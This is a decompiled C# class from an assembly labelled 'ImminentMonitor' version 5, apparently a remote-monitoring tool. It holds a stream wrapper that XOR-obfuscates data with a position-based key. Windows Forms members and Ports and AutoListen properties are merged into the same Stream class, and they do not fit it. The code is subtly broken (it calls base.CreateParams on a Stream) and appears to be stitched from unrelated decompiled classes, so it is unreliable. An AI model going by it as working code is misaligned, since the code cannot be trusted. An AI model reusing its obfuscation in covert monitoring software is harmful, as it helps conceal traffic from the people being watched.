// Decompiled with JetBrains decompiler
// Type: Stream0
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

internal sealed class Stream0 : Stream
{
  private readonly int int_0;
  private Stream stream_0;

  public Stream0(Stream stream_1, int int_1)
  {
    this.method_1(stream_1);
    this.int_0 = int_1;
  }

  public Stream method_0() => this.stream_0;

  private void method_1(Stream stream_1) => this.stream_0 = stream_1;

  [SpecialName]
  public override bool get_CanRead() => this.method_0().CanRead;

  [SpecialName]
  public override bool get_CanSeek() => this.method_0().CanSeek;

  [SpecialName]
  public override bool get_CanWrite() => this.method_0().CanWrite;

  public override void Flush() => this.method_0().Flush();

  [SpecialName]
  public override long get_Length() => this.method_0().Length;

  [SpecialName]
  public override long get_Position() => this.method_0().Position;

  [SpecialName]
  public override void set_Position(long value) => this.method_0().Position = value;

  private byte method_2(byte byte_0, long long_0)
  {
    byte num = (byte) ((uint) (this.int_0 ^ -559030707) ^ (uint) long_0);
    return (byte) ((uint) byte_0 ^ (uint) num);
  }

  public override void Write(byte[] buffer, int offset, int count)
  {
    byte[] numArray = new byte[count];
    Buffer.BlockCopy((Array) buffer, offset, (Array) numArray, 0, count);
    long position = this.Position;
    for (int index = 0; index < count; ++index)
      numArray[index] = this.method_2(numArray[index], position + (long) index);
    this.method_0().Write(numArray, 0, count);
  }

  public override int Read(byte[] buffer, int offset, int count)
  {
    long position = this.Position;
    byte[] buffer1 = new byte[count];
    int num = this.method_0().Read(buffer1, 0, count);
    for (int index = 0; index < num; ++index)
      buffer[index + offset] = this.method_2(buffer1[index], position + (long) index);
    return num;
  }

  public override long Seek(long offset, SeekOrigin origin) => this.method_0().Seek(offset, origin);

  public override void SetLength(long value) => this.method_0().SetLength(value);

  protected virtual Size DefaultSize
  {
    [SpecialName] get => new Size(200, 16);
  }

  protected virtual bool ShowWithoutActivation
  {
    [SpecialName] get => true;
  }

  protected virtual CreateParams CreateParams
  {
    [SpecialName] get
    {
      CreateParams createParams = base.CreateParams;
      createParams.ExStyle |= 8;
      createParams.ClassStyle |= 131072;
      return createParams;
    }
  }

  public ushort[] Ports { [SpecialName] get; [SpecialName] set; }

  public bool AutoListen { [SpecialName] get; [SpecialName] set; }
}
